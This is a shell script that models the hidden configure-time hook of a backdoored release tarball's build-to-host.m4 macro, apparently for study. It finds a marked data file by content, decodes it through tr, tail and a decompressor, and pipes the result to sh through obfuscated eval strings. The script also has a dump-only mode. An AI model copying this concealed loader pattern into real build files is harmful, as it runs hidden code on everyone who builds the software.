#!/bin/sh
# Model of the configure-time hook that the injected m4/build-to-host.m4 adds to a release tarball.
# usage: build-to-host-analog.sh [--dump-stage1] SRCDIR BUILDDIR
# Without the m4 macro (a git checkout) the hook does not exist and nothing happens.
# With it, the hook finds the marked data file by content, decodes it, and pipes the result to sh.
# --dump-stage1 prints the decoded stage-1 script instead of running it.
LC_ALL=C
export LC_ALL

dump=0
if [ "${1-}" = "--dump-stage1" ]; then
  dump=1
  shift
fi
if [ "$#" -ne 2 ]; then
  echo "usage: build-to-host-analog.sh [--dump-stage1] SRCDIR BUILDDIR" >&2
  exit 2
fi
srcdir=$1
builddir=$2
export srcdir builddir

if [ ! -f "$srcdir/m4/build-to-host.m4" ]; then
  echo "no build-to-host.m4: hook absent"
  exit 0
fi

# Content-based discovery: the data file is never named in any build file.
gl_am_configmake=$(find "$srcdir" -type f -exec grep -l -E '#{4}[[:alnum:]]{5}#{4}$' {} + 2>/dev/null)
if [ -z "$gl_am_configmake" ]; then
  echo "no marked data file: hook finds nothing"
  exit 0
fi
# The file-name suffix names the decompressor, as in the real macro (there it was xz).
# shellcheck disable=SC2034 # gl_prefix is read by the eval below
gl_prefix=$(echo "$gl_am_configmake" | sed 's/.*\.//')
# shellcheck disable=SC2034 # read by the eval below
gl_path_map='tr "\t \-_" " \t_\-"'
# sed "r\n" reads a file named \n that does not exist, so it prints its input: an obfuscated cat.
# shellcheck disable=SC2016,SC2034 # the string is evaluated later, on purpose
gl_config='sed "r\n" "$gl_am_configmake" | eval "$gl_path_map" | tail -c +15 | $gl_prefix -d 2>/dev/null'
# shellcheck disable=SC2016 # evaluated later, on purpose
gl_config_gt='eval "$gl_config"'

if [ "$dump" -eq 1 ]; then
  eval "$gl_config_gt"
else
  eval "$gl_config_gt" | /bin/sh
  echo "hook ran"
fi
